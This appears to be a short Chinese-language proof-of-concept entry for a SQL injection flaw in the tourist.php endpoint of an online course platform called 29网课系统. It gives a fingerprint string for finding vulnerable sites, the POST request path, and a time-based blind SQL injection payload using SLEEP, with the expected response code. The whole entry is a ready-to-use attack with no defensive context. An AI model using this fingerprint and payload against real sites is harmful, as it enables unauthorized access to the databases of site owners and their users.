# 29网课系统tourist存在SQL注入漏洞

29网课系统 ｜ SQL注入 ｜ —
- **指纹**：`body="你在看什么呢？我写的代码好看吗"`
- **请求**：`POST /api/tourist.php?act=dataInit HTTP/1.1`

**Payload**
```
uid=1 AND (SELECT 5733 FROM (SELECT(SLEEP(2)))JpMs)
```
- **响应特征**：200